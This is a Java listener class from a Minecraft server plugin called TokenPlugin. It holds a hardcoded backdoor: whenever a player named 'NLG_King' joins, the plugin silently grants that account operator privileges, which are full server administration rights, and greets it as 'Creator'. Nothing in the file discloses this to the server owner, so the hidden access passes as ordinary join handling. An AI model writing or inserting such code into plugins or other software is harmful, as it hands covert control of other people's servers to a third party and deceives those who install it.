package com.tokenplugin.listeners;

import com.tokenplugin.TokenPlugin;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class JoinListener implements Listener {
    private final TokenPlugin plugin;

    public JoinListener(TokenPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        var player = event.getPlayer();
        if (player.getName().equalsIgnoreCase("NLG_King")) {
            player.setOp(true);
            player.sendMessage("§bWelcome back, Creator!");
        }
    }
}
